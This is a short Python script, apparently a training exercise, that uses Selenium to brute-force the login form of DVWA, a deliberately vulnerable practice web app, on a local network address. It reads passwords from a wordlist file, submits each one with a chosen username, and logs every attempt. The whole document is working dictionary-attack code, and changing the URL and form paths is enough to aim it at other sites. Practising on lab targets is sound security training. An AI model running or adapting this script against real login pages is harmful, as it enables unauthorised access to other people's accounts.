
from selenium import webdriver
import time

## Author = [Przemysław Szmaj]
## GitHub = https://github.com/PSZMAJ
## YouTube = https://www.youtube.com/channel/UCewT7Lr5f6LWvqSPXm0JKRw

login = input('Please eneter login: ')
browser = webdriver.Firefox()
browser.get('http://192.168.0.33/dvwa/login.php')
time.sleep(2)
    

def BruteForceBot():
    login_attempt = 0
    with open("slownik.txt", "r") as file:
        lines = file.readlines()
    for line in lines:
       
        button_username = browser.find_element_by_xpath('/html/body/div[1]/form/fieldset/input[1]')
        button_username.click()
        time.sleep(2)
        button_username.send_keys(login)
        time.sleep(2)
                
        button_password = browser.find_element_by_xpath('/html/body/div[1]/form/fieldset/input[2]')
        button_password.click()
        time.sleep(2)
        button_password.send_keys(line)
            
        button_login = browser.find_element_by_xpath('/html/body/div[1]/form/fieldset/p/input')
        button_login.click()
        login_attempt = login_attempt + 1
        print('Login attempt', login_attempt, ' with key/password : ', line )

BruteForceBot()